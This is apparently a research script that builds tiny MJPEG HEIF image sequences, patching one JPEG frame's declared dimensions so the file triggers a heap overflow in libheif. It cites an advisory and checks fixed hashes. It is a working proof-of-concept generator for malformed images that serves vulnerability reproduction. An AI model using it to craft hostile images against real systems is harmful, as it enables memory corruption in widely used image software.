#!/usr/bin/env python3
"""W184: derive ~1.2 kB mixed-size MJPEG HEIF sequences from pinned-heif-enc boxes.

The pinned `heif-enc -S --jpeg` re-encodes each input JPEG at its own fixed
quality, so even a 288-byte uniform 512x64 source JPEG becomes a 1138-byte
sample and the reference HEIF is 4262 bytes. To measure the smallest file that
still reaches the overflow, keep only the encoder's ftyp+moov boxes and put the
original, already-small JPEGs in one mdat, adjusting stsz/stco. Only JPEG SOF0
dimensions of the second sample are changed (H=512, W=64), as in W161/W183;
entropy bytes are untouched. This is a container reconstruction, not a file the
upstream encoder writes, and it is not the advisory's unpublished 1,155-byte
PoC.

Inputs (committed under evidence/tiny-mjpeg/): uniform64.jpg (288 B, genuine
512x64) and uniform72.jpg (304 B, genuine 512x72), both grayscale quality 1,
4:4:4, optimize=True, all bytes 0x40.

Usage: make_tiny_mjpeg_sequence.py SOURCE_DIR OUT_DIR
HEIF_ENC defaults to the pinned plain Release heif-enc build tree.
"""
import hashlib
import os
import struct
import subprocess
import sys
from pathlib import Path

HASHES = {
    "uniform64.jpg": "4f0396f825c0ff492161c03509d2d184e742b48bd5720534dfbf8772cd7492dc",
    "uniform72.jpg": "a77f60988fd3338bba97c0fac06c4d0f96aba3a1ff67d12b3f90130f94f6601e",
    "template.heif": "7d820881957402b629d0d627bee786566a1e0c7d13c455864807abad9492b9bc",
    "tiny64-ref.heif": "f2cb1ac007388ba234096ce22bbd8301fe98f6256616e1e338e51867461f2fcb",
    "tiny64-mixed.heif": "aa8e0600ada35537dd2f49314743571221719faaed3236371f10d031767e0c58",
    "tiny72-ref.heif": "a02b50a6094524b0f67e0639e473627c2d557fa6d7923054241c0ac1888d03c0",
    "tiny72-mixed.heif": "231bb209c008cd14e9d623c9a44975f7d3d7b171b847ca7a427da41ef1b94e89",
}
DEFAULT_ENC = "/tmp/libheif2shell-vuln-plain/examples/heif-enc"


def digest(path):
    return hashlib.sha256(Path(path).read_bytes()).hexdigest()


def assert_hash(path, name):
    got = digest(path)
    if got != HASHES[name]:
        raise SystemExit(f"{name}: expected {HASHES[name]}, got {got}")


def build(src, out, sample, patched):
    """Keep ftyp+moov from template; one mdat containing two `sample` JPEGs."""
    template = (out / "template.heif").read_bytes()
    boxes, offset = {}, 0
    while offset + 8 <= len(template):
        size, kind = struct.unpack_from(">I4s", template, offset)
        if size < 8 or offset + size > len(template):
            raise SystemExit(f"bad box at {offset}")
        boxes[kind] = template[offset:offset + size]
        offset += size
    ftyp, moov = boxes[b"ftyp"], bytearray(boxes[b"moov"])

    # moov starts at template offset 40. Sample tables in the nested boxes:
    # moov starts at template offset 40. stsz starts at template 551 (kind
    # at 555, sample_size at 563); stco at 571 (kind at 575, chunk offset 587).
    if bytes(moov[515:519]) != b"stsz" or bytes(moov[535:539]) != b"stco":
        raise SystemExit("unexpected moov layout")
    struct.pack_into(">I", moov, 523, len(sample))
    mdat_offset = len(ftyp) + len(moov) + 8
    struct.pack_into(">I", moov, 547, mdat_offset)

    payload = sample * 2
    mdat = struct.pack(">I4s", 8 + len(payload), b"mdat") + payload
    data = bytearray(ftyp + bytes(moov) + mdat)
    if patched:
        first = data.find(b"\xff\xd8", mdat_offset)
        second = data.find(b"\xff\xd8", first + 1)
        sof = data.find(b"\xff\xc0", second)
        if sof < 0:
            raise SystemExit("no SOF0 in second sample")
        height, width = struct.unpack_from(">HH", data, sof + 5)
        if height != 64 and height != 72:
            raise SystemExit(f"unexpected second-frame height {height}")
        struct.pack_into(">HH", data, sof + 5, 512, 64)  # SOF order: H,W
    return data


def main():
    if len(sys.argv) != 3:
        raise SystemExit("usage: make_tiny_mjpeg_sequence.py SOURCE_DIR OUT_DIR")
    src, out = Path(sys.argv[1]), Path(sys.argv[2])
    out.mkdir(parents=True, exist_ok=True)
    enc = os.environ.get("HEIF_ENC", DEFAULT_ENC)
    for name in ("uniform64.jpg", "uniform72.jpg"):
        assert_hash(src / name, name)
    template = out / "template.heif"
    subprocess.run([enc, "-S", "--jpeg", str(src / "uniform64.jpg"),
                    str(src / "uniform64.jpg"), "-o", str(template)],
                   check=True, capture_output=True)
    assert_hash(template, "template.heif")

    sample64 = (src / "uniform64.jpg").read_bytes()
    sample72 = (src / "uniform72.jpg").read_bytes()
    products = {
        "tiny64-ref.heif": (sample64, False),
        "tiny64-mixed.heif": (sample64, True),
        "tiny72-ref.heif": (sample72, False),
        "tiny72-mixed.heif": (sample72, True),
    }
    for name, (sample, patched) in products.items():
        data = build(src, out, sample, patched)
        (out / name).write_bytes(data)
        assert_hash(out / name, name)
        print(f"wrote {out / name}: {len(data)} bytes, sha256={digest(out / name)}")


if __name__ == "__main__":
    main()
